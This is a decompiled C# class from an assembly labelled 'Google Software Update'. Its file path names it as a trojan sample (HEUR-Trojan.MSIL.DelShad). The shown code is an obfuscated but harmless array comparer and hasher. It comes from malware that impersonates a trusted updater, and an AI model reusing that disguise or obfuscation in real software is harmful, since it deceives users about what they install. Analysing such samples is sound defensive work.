// Decompiled with JetBrains decompiler
// Type: C3554254475.C856455061`1
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace C3554254475
{
  internal sealed class C856455061<C3554254475> : 
    IEqualityComparer<C3554254475[]>,
    IComparer<C3554254475[]>
    where C3554254475 : IEquatable<C3554254475>, IComparable<C3554254475>
  {
    public int GetHashCode([In] C3554254475[] obj0)
    {
      if (obj0 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C476252946());
      uint hashCode = 3245957815;
      int length = obj0.Length;
      for (int index = 0; index < length; ++index)
        hashCode = C2137352139.C3554254475((hashCode + (uint) obj0[index].GetHashCode()) * 1606634599U, 13);
      return (int) hashCode;
    }

    public bool Equals([In] C3554254475[] obj0, [In] C3554254475[] obj1)
    {
      if (obj0 == obj1)
        return true;
      if (obj0 == null || obj1 == null)
        return false;
      int length = obj0.Length;
      if (length != obj1.Length)
        return false;
      for (int index = 0; index < length; ++index)
      {
        if (!obj0[index].Equals(obj1[index]))
          return false;
      }
      return true;
    }

    public int Compare([In] C3554254475[] obj0, [In] C3554254475[] obj1)
    {
      if (obj0 == obj1)
        return 0;
      if (obj0 == null)
        return -1;
      if (obj1 == null)
        return 1;
      int length1 = obj0.Length;
      int length2 = obj1.Length;
      if (length1 != length2)
        return length1 < length2 ? -1 : 1;
      for (int index = 0; index < length1; ++index)
      {
        C3554254475 c3554254475 = obj0[index];
        C3554254475 other = obj1[index];
        if (!c3554254475.Equals(other))
          return c3554254475.CompareTo(other);
      }
      return 0;
    }
  }
}
